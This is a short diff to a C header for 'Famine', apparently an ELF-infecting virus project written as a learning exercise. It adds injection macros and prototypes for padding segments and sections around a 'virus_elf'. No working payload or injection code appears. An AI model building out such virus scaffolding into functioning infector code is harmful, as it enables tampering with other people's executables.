@@ -14,6 +14,14 @@
 # include <sys/mman.h>
 # include <unistd.h>
 
+# ifndef INJECT
+#  define INJECT
+# endif
+
+# ifndef INJECT_SIZE
+#  define INJECT_SIZE 0
+# endif
+
 # define SIGNATURE "Famine version 1.0 (c)oded by lmartin"
 
 # define PAGE_SIZE 0x1000
@@ -32,9 +40,15 @@ typedef struct		s_elf
 	Elf64_Shdr		*text_section;
 }					t_elf;
 
+int			get_size_needed(t_elf *elf, t_elf *virus_elf);
+
 /* elf.c */
-int			init_elf(t_elf *elf, void *addr, long size);
-int			check_magic_elf(void *addr);
+int		init_elf(t_elf *elf, void *addr, long size);
+int		check_magic_elf(void *addr);
+
+/* padding.c */
+void	*add_padding_segments(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero);
+void	*add_padding_sections(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero);
 
 /* utils.c */
 void	*ft_memmem(const void *l, size_t l_len, const void *s, size_t s_len);
